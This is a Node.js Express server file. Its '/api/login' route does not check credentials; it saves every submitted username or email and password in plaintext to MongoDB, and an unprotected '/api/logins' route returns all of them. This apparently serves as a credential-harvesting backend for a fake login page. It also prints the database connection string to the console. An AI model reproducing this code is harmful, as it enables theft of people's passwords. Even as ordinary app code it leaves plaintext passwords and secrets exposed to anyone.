require('dotenv').config();
console.log("MONGO_URI:", process.env.MONGO_URI);  // This will log the URI to verify it's being read correctly

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("MongoDB Connected"))
    .catch(err => {
        console.error("MongoDB Connection Error:", err);
        process.exit(1);  // Exit process if MongoDB connection fails
    });

// Define Schema
const loginSchema = new mongoose.Schema({
    usernameOrEmail: String,
    password: String,
    timestamp: { type: Date, default: Date.now }
});
const Login = mongoose.model('Login', loginSchema);

// API Endpoint to store login details
app.post('/api/login', async (req, res) => {
    try {
        const { usernameOrEmail, password } = req.body;
        const newLogin = new Login({ usernameOrEmail, password });
        await newLogin.save();
        res.json({ success: true, message: "Login recorded" });
    } catch (error) {
        console.error("Error saving login:", error);  // Log the error
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
});

// API Endpoint to get stored logins (For viewing records)
app.get('/api/logins', async (req, res) => {
    try {
        const logins = await Login.find();
        res.json(logins);
    } catch (error) {
        console.error("Error fetching logins:", error);  // Log the error
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
